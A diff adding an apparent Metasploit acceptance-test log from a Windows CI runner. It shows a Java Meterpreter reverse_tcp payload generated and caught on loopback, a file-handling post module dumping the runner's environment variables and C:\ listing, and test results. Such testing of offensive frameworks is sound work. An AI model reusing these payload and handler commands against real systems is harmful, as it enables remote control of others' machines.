@@ -1,0 +1,250 @@
+use java/meterpreter/reverse_tcp
+msf6 payload(java/meterpreter/reverse_tcp) > generate -o D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-3292-len01t.jar -f jar AutoVerifySessionTimeout=10 spawn=0 lport=6001 lhost=127.0.0.1
+[*] Writing 5265 bytes to D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220203-3292-len01t.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 0
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Sending stage (58075 bytes) to 127.0.0.1
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:50098 ) at 2022-02-03 22:41:56 +0000
+use test/file
+msf6 post(test/file) > run session=1 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to %TEMP%
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 1
+[*] Session type is meterpreter and platform is windows
+{
+  "ACLOCAL_PATH": "/mingw64/share/aclocal:/usr/share/aclocal",
+  "ALLUSERSPROFILE": "C:\\ProgramData",
+  "ANDROID_HOME": "C:\\Android\\android-sdk",
+  "ANDROID_NDK_HOME": "C:\\Android\\android-sdk\\ndk-bundle",
+  "ANDROID_NDK_LATEST_HOME": "C:\\Android\\android-sdk\\ndk\\23.1.7779620",
+  "ANDROID_NDK_PATH": "C:\\Android\\android-sdk\\ndk-bundle",
+  "ANDROID_NDK_ROOT": "C:\\Android\\android-sdk\\ndk-bundle",
+  "ANDROID_SDK_ROOT": "C:\\Android\\android-sdk",
+  "ANT_HOME": "C:\\ProgramData\\chocolatey\\lib\\ant\\tools\\apache-ant-1.10.12",
+  "APPDATA": "C:\\Users\\runneradmin\\AppData\\Roaming",
+  "AZURE_EXTENSION_DIR": "C:\\Program Files\\Common Files\\AzureCliExtensionDirectory",
+  "BUNDLER_ORIG_BUNDLER_VERSION": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_BUNDLE_BIN_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_BUNDLE_GEMFILE": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_GEM_HOME": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_GEM_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_MANPATH": "/mingw64/share/man",
+  "BUNDLER_ORIG_PATH": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_RB_USER_INSTALL": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_RUBYLIB": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_ORIG_RUBYOPT": "BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL",
+  "BUNDLER_VERSION": "2.1.4",
+  "BUNDLE_BIN_PATH": "C:/hostedtoolcache/windows/Ruby/3.0.2/x64/lib/ruby/gems/3.0.0/gems/bundler-2.1.4/exe/bundle",
+  "BUNDLE_GEMFILE": "D:/a/metasploit-framework/metasploit-framework/Gemfile",
+  "CABAL_DIR": "C:\\cabal",
+  "ChocolateyInstall": "C:\\ProgramData\\chocolatey",
+  "ChromeWebDriver": "C:\\SeleniumWebDrivers\\ChromeDriver",
+  "CI": "true",
+  "COBERTURA_HOME": "C:\\cobertura-2.1.1",
+  "CommonProgramFiles": "C:\\Program Files\\Common Files",
+  "CommonProgramFiles(x86)": "C:\\Program Files (x86)\\Common Files",
+  "CommonProgramW6432": "C:\\Program Files\\Common Files",
+  "COMPUTERNAME": "fv-az159-880",
+  "ComSpec": "C:\\Windows\\system32\\cmd.exe",
+  "CONDA": "C:\\Miniconda",
+  "DEPLOYMENT_BASEPATH": "C:\\actions",
+  "DOTNET_MULTILEVEL_LOOKUP": "0",
+  "DriverData": "C:\\Windows\\System32\\Drivers\\DriverData",
+  "EdgeWebDriver": "C:\\SeleniumWebDrivers\\EdgeDriver",
+  "GCM_INTERACTIVE": "Never",
+  "GeckoWebDriver": "C:\\SeleniumWebDrivers\\GeckoDriver",
+  "GEM_HOME": "D:/a/metasploit-framework/metasploit-framework/vendor/bundle/ruby/3.0.0",
+  "GEM_PATH": "",
+  "GHCUP_INSTALL_BASE_PREFIX": "C:\\",
+  "GHCUP_MSYS2": "C:\\msys64",
+  "GITHUB_ACTION": "__run_3",
+  "GITHUB_ACTIONS": "true",
+  "GITHUB_ACTION_REF": "",
+  "GITHUB_ACTION_REPOSITORY": "",
+  "GITHUB_ACTOR": "AlanFoster",
+  "GITHUB_API_URL": "https://api.github.com",
+  "GITHUB_BASE_REF": "",
+  "GITHUB_ENV": "D:\\a\\_temp\\_runner_file_commands\\set_env_cabc08b2-ff7d-4f00-9e67-4ba98d84133a",
+  "GITHUB_EVENT_NAME": "push",
+  "GITHUB_EVENT_PATH": "D:\\a\\_temp\\_github_workflow\\event.json",
+  "GITHUB_GRAPHQL_URL": "https://api.github.com/graphql",
+  "GITHUB_HEAD_REF": "",
+  "GITHUB_JOB": "test",
+  "GITHUB_PATH": "D:\\a\\_temp\\_runner_file_commands\\add_path_cabc08b2-ff7d-4f00-9e67-4ba98d84133a",
+  "GITHUB_REF": "refs/heads/investigate-github-actions-for-windows",
+  "GITHUB_REF_NAME": "investigate-github-actions-for-windows",
+  "GITHUB_REF_PROTECTED": "false",
+  "GITHUB_REF_TYPE": "branch",
+  "GITHUB_REPOSITORY": "AlanFoster/metasploit-framework",
+  "GITHUB_REPOSITORY_OWNER": "AlanFoster",
+  "GITHUB_RETENTION_DAYS": "90",
+  "GITHUB_RUN_ATTEMPT": "1",
+  "GITHUB_RUN_ID": "1792131459",
+  "GITHUB_RUN_NUMBER": "203",
+  "GITHUB_SERVER_URL": "https://github.com",
+  "GITHUB_SHA": "e112702021767c3aeebbcad04270bc83e5d6fb80",
+  "GITHUB_WORKFLOW": "Acceptance",
+  "GITHUB_WORKSPACE": "D:\\a\\metasploit-framework\\metasploit-framework",
+  "GOROOT_1_15_X64": "C:\\hostedtoolcache\\windows\\go\\1.15.15\\x64",
+  "GOROOT_1_16_X64": "C:\\hostedtoolcache\\windows\\go\\1.16.13\\x64",
+  "GOROOT_1_17_X64": "C:\\hostedtoolcache\\windows\\go\\1.17.6\\x64",
+  "GRADLE_HOME": "C:\\ProgramData\\chocolatey\\lib\\gradle\\tools\\gradle-7.3.3",
+  "HOME": "C:\\Users\\runneradmin",
+  "HOMEDRIVE": "C:",
+  "HOMEPATH": "\\Users\\runneradmin",
+  "IEWebDriver": "C:\\SeleniumWebDrivers\\IEDriver",
+  "ImageOS": "win19",
+  "ImageVersion": "20220131.1",
+  "JAVA_HOME": "C:\\hostedtoolcache\\windows\\Java_Temurin-Hotspot_jdk\\8.0.322-6\\x64",
+  "JAVA_HOME_11_X64": "C:\\hostedtoolcache\\windows\\Java_Temurin-Hotspot_jdk\\11.0.14-9\\x64",
+  "JAVA_HOME_13_X64": "C:\\hostedtoolcache\\windows\\Java_Adopt_jdk\\13.0.2-8.1\\x64",
+  "JAVA_HOME_17_X64": "C:\\hostedtoolcache\\windows\\Java_Temurin-Hotspot_jdk\\17.0.2-8\\x64",
+  "JAVA_HOME_8_X64": "C:\\hostedtoolcache\\windows\\Java_Temurin-Hotspot_jdk\\8.0.322-6\\x64",
+  "LANG": "en_US.UTF-8",
+  "LOCALAPPDATA": "C:\\Users\\runneradmin\\AppData\\Local",
+  "LOGONSERVER": "\\\\fv-az159-880",
+  "M2": "C:\\ProgramData\\chocolatey\\lib\\maven\\apache-maven-3.8.4\\bin",
+  "M2_REPO": "C:\\ProgramData\\m2",
+  "MAKE": "make.exe",
+  "MANPATH": "/mingw64/share/man",
+  "MAVEN_OPTS": "-Xms256m",
+  "MINGW_CHOST": "x86_64-w64-mingw32",
+  "MINGW_PACKAGE_PREFIX": "mingw-w64-x86_64",
+  "MINGW_PREFIX": "/mingw64",
+  "MonAgentClientLocation": "C:\\Packages\\Plugins\\Microsoft.Azure.Geneva.GenevaMonitoring\\2.33.0.3\\Monitoring\\Agent",
+  "MSYS2_PATH_TYPE": "inherit",
+  "MSYSTEM": "MINGW64",
+  "MSYSTEM_CARCH": "x86_64",
+  "MSYSTEM_CHOST": "x86_64-w64-mingw32",
+  "MSYSTEM_PREFIX": "/mingw64",
+  "npm_config_prefix": "C:\\npm\\prefix",
+  "NUMBER_OF_PROCESSORS": "2",
+  "OS": "Windows_NT",
+  "Path": "D:/a/metasploit-framework/metasploit-framework/vendor/bundle/ruby/3.0.0/bin;D:/a/metasploit-framework/metasploit-framework:D:/a/metasploit-framework/metasploit-framework/vendor/bundle/ruby/3.0.0/bin;C:\\Program Files\\PowerShell\\7;C:\\hostedtoolcache\\windows\\Ruby\\3.0.2\\x64\\bin;C:\\msys64\\mingw64\\bin;C:\\msys64\\usr\\bin;C:\\Program Files\\MongoDB\\Server\\5.0\\bin;C:\\aliyun-cli;C:\\vcpkg;C:\\cf-cli;C:\\Program Files (x86)\\NSIS\\;C:\\tools\\zstd;C:\\Program Files\\Mercurial\\;C:\\hostedtoolcache\\windows\\stack\\2.7.3\\x64;C:\\cabal\\bin;C:\\\\ghcup\\bin;C:\\tools\\ghc-9.2.1\\bin;C:\\Program Files\\dotnet;C:\\mysql\\bin;C:\\Program Files\\R\\R-4.1.2\\bin\\x64;C:\\SeleniumWebDrivers\\GeckoDriver;C:\\Program Files (x86)\\sbt\\bin;C:\\Program Files (x86)\\GitHub CLI;C:\\Program Files\\Git\\bin;C:\\Program Files (x86)\\pipx_bin;C:\\hostedtoolcache\\windows\\go\\1.15.15\\x64\\bin;C:\\hostedtoolcache\\windows\\Python\\3.7.9\\x64\\Scripts;C:\\hostedtoolcache\\windows\\Python\\3.7.9\\x64;C:\\tools\\kotlinc\\bin;C:\\hostedtoolcache\\windows\\Java_Temurin-Hotspot_jdk\\8.0.322-6\\x64\\bin;C:\\npm\\prefix;C:\\Program Files (x86)\\Microsoft SDKs\\Azure\\CLI2\\wbin;C:\\ProgramData\\kind;C:\\Program Files\\Eclipse Foundation\\jdk-8.0.302.8-hotspot\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\ProgramData\\Chocolatey\\bin;C:\\Program Files\\Docker;C:\\Program Files\\PowerShell\\7\\;C:\\Program Files\\Microsoft\\Web Platform Installer\\;C:\\Program Files\\dotnet\\;C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Program Files (x86)\\Microsoft SQL Server\\110\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\120\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\130\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\140\\DTS\\Binn\\;C:\\Program Files (x86)\\Microsoft SQL Server\\150\\DTS\\Binn\\;C:\\Program Files\\nodejs\\;C:\\Program Files\\OpenSSL\\bin;C:\\Strawberry\\c\\bin;C:\\Strawberry\\perl\\site\\bin;C:\\Strawberry\\perl\\bin;C:\\ProgramData\\chocolatey\\lib\\pulumi\\tools\\Pulumi\\bin;C:\\Program Files\\TortoiseSVN\\bin;C:\\Program Files\\CMake\\bin;C:\\ProgramData\\chocolatey\\lib\\maven\\apache-maven-3.8.4\\bin;C:\\Program Files\\Microsoft Service Fabric\\bin\\Fabric\\Fabric.Code;C:\\Program Files\\Microsoft SDKs\\Service Fabric\\Tools\\ServiceFabricLocalClusterManager;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\bin;c:\\tools\\php;C:\\SeleniumWebDrivers\\ChromeDriver\\;C:\\SeleniumWebDrivers\\EdgeDriver\\;C:\\Program Files\\Amazon\\AWSCLIV2\\;C:\\Program Files\\Amazon\\SessionManagerPlugin\\bin\\;C:\\Program Files\\Amazon\\AWSSAMCLI\\bin\\;C:\\Program Files (x86)\\Google\\Cloud SDK\\google-cloud-sdk\\bin;C:\\Program Files (x86)\\Microsoft BizTalk Server\\;C:\\Program Files\\LLVM\\bin;C:\\Users\\runneradmin\\.dotnet\\tools;C:\\Users\\runneradmin\\.cargo\\bin;C:\\Users\\runneradmin\\AppData\\Local\\Microsoft\\WindowsApps",
+  "PATHEXT": ".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL",
+  "PERFLOG_LOCATION_SETTING": "RUNNER_PERFLOG",
+  "PGBIN": "C:\\Program Files\\PostgreSQL\\14\\bin",
+  "PGDATA": "C:\\Program Files\\PostgreSQL\\14\\data",
+  "PGPASSWORD": "root",
+  "PGROOT": "C:\\Program Files\\PostgreSQL\\14",
+  "PGUSER": "postgres",
+  "PHPROOT": "c:\\tools\\php",
+  "PIPX_BIN_DIR": "C:\\Program Files (x86)\\pipx_bin",
+  "PIPX_HOME": "C:\\Program Files (x86)\\pipx",
+  "PKG_CONFIG_PATH": "/mingw64/lib/pkgconfig:/mingw64/share/pkgconfig",
+  "POWERSHELL_DISTRIBUTION_CHANNEL": "GitHub-Actions-win19",
+  "POWERSHELL_UPDATECHECK": "Off",
+  "PROCESSOR_ARCHITECTURE": "AMD64",
+  "PROCESSOR_IDENTIFIER": "Intel64 Family 6 Model 79 Stepping 1, GenuineIntel",
+  "PROCESSOR_LEVEL": "6",
+  "PROCESSOR_REVISION": "4f01",
+  "ProgramData": "C:\\ProgramData",
+  "ProgramFiles": "C:\\Program Files",
+  "ProgramFiles(x86)": "C:\\Program Files (x86)",
+  "ProgramW6432": "C:\\Program Files",
+  "PROMPT": "$P$G",
+  "PSModulePath": "C:\\Users\\runneradmin\\Documents\\PowerShell\\Modules;C:\\Program Files\\PowerShell\\Modules;c:\\program files\\powershell\\7\\Modules;C:\\\\Modules\\azurerm_2.1.0;C:\\\\Modules\\azure_2.1.0;C:\\Users\\packer\\Documents\\WindowsPowerShell\\Modules;C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules;C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\PowerShell\\Modules\\;C:\\Program Files (x86)\\Google\\Cloud SDK\\google-cloud-sdk\\platform\\PowerShell",
+  "PUBLIC": "C:\\Users\\Public",
+  "RAILS_ENV": "test",
+  "RI_DEVKIT": "c:\\msys64",
+  "RTOOLS40_HOME": "C:\\rtools40",
+  "RUBYLIB": "C:/hostedtoolcache/windows/Ruby/3.0.2/x64/lib/ruby/gems/3.0.0/gems/bundler-2.1.4/lib",
+  "RUBYOPT": "-rC:/hostedtoolcache/windows/Ruby/3.0.2/x64/lib/ruby/gems/3.0.0/gems/bundler-2.1.4/lib/bundler/setup",
+  "RUNNER_ARCH": "X64",
+  "RUNNER_NAME": "Hosted Agent",
+  "RUNNER_OS": "Windows",
+  "RUNNER_PERFLOG": "C:\\actions\\perflog",
+  "RUNNER_TEMP": "D:\\a\\_temp",
+  "RUNNER_TOOL_CACHE": "C:\\hostedtoolcache\\windows",
+  "RUNNER_TRACKING_ID": "github_99190fd9-5c43-460e-9728-be2b75435979",
+  "RUNNER_WORKSPACE": "D:\\a\\metasploit-framework",
+  "SBT_HOME": "C:\\Program Files (x86)\\sbt\\",
+  "SELENIUM_JAR_PATH": "C:\\selenium\\selenium-server.jar",
+  "SystemDrive": "C:",
+  "SystemRoot": "C:\\Windows",
+  "TEMP": "C:\\Users\\RUNNER~1\\AppData\\Local\\Temp",
+  "TMP": "C:\\Users\\RUNNER~1\\AppData\\Local\\Temp",
+  "TMPDIR": "D:\\a\\_temp",
+  "USER": "runneradmin",
+  "USERDOMAIN": "fv-az159-880",
+  "USERDOMAIN_ROAMINGPROFILE": "fv-az159-880",
+  "USERNAME": "runneradmin",
+  "USERPROFILE": "C:\\Users\\runneradmin",
+  "VCPKG_INSTALLATION_ROOT": "C:\\vcpkg",
+  "VS140COMNTOOLS": "C:\\Program Files (x86)\\Microsoft Visual Studio 14.0\\Common7\\Tools\\",
+  "windir": "C:\\Windows",
+  "WIX": "C:\\Program Files (x86)\\WiX Toolset v3.11\\"
+}
+ Volume in drive C is Windows
+ Volume Serial Number is 1623-3F3C
+
+ Directory of C:\
+
+02/03/2022  09:12 AM    <DIR>          actions
+02/01/2022  01:40 AM    <DIR>          aliyun-cli
+02/01/2022  12:10 AM    <DIR>          Android
+02/01/2022  01:33 AM    <DIR>          cabal
+02/01/2022  01:36 AM    <DIR>          cf-cli
+02/26/2015  11:23 PM    <DIR>          cobertura-2.1.1
+02/03/2022  10:24 PM    <DIR>          data
+02/01/2022  01:33 AM    <DIR>          ghcup
+01/31/2022  11:46 PM    <DIR>          hostedtoolcache
+01/31/2022  09:10 PM    <DIR>          image
+02/03/2022  09:19 AM               483 imagedata.json
+01/31/2022  09:19 PM    <DIR>          inetpub
+02/01/2022  02:21 AM            41,590 InstalledSoftware.md
+01/31/2022  11:45 PM    <DIR>          Julia
+01/31/2022  10:42 PM    <DIR>          Microsoft
+02/01/2022  01:34 AM    <DIR>          Miniconda
+02/01/2022  12:40 AM    <DIR>          Modules
+02/01/2022  12:58 AM    <DIR>          msys64
+11/29/2021  09:34 PM    <DIR>          mysql
+01/31/2022  11:35 PM    <DIR>          npm
+01/31/2022  09:18 PM    <DIR>          Packages
+01/19/2022  06:22 PM    <DIR>          PerfLogs
+01/31/2022  09:09 PM    <DIR>          post-generation
+02/01/2022  01:52 AM    <DIR>          Program Files
+02/01/2022  01:51 AM    <DIR>          Program Files (x86)
+02/01/2022  01:07 AM    <DIR>          rtools40
+02/03/2022  09:14 AM    <DIR>          runners
+02/01/2022  12:56 AM    <DIR>          selenium
+02/01/2022  12:56 AM    <DIR>          SeleniumWebDrivers
+02/01/2022  01:51 AM    <DIR>          shells
+01/31/2022  11:44 PM    <DIR>          Strawberry
+02/01/2022  01:23 AM    <DIR>          Temp
+02/01/2022  01:35 AM    <DIR>          tools
+02/03/2022  09:13 AM    <DIR>          Users
+02/01/2022  01:36 AM    <DIR>          vcpkg
+02/03/2022  09:10 AM    <DIR>          Windows
+02/03/2022  09:10 AM    <DIR>          WindowsAzure
+06/25/2010  10:10 AM    <DIR>          WpdPack
+               2 File(s)         42,073 bytes
+              36 Dir(s)  93,126,344,704 bytes free
+Does this exist? c:\boot.ini==false
+Does this exist? c:\pagefile.sys==false
+Does this exist? /etc/passwd==false
+Does this exist? /etc/master.passwd==false
+Does this exist? %WINDIR%\system32\notepad.exe==false
+Does this exist? %WINDIR%\system32\calc.exe==false
+[-] FAILED: should test for file existence
+[+] should create text files
+[+] should read the text we just wrote
+[+] should append text files
+[+] should delete text files
+[+] should move files
+[-] Post failed: Errno::ENOENT No such file or directory @ rb_sysopen - /bin/echo
+[-] Call stack:
+[-]   D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/file.rb:220:in `read'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/file.rb:220:in `test_binary_files'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:18:in `block in run_all_tests'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `each'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `run_all_tests'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:57:in `run'
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Post module execution completed
+msf6 post(test/file) > 
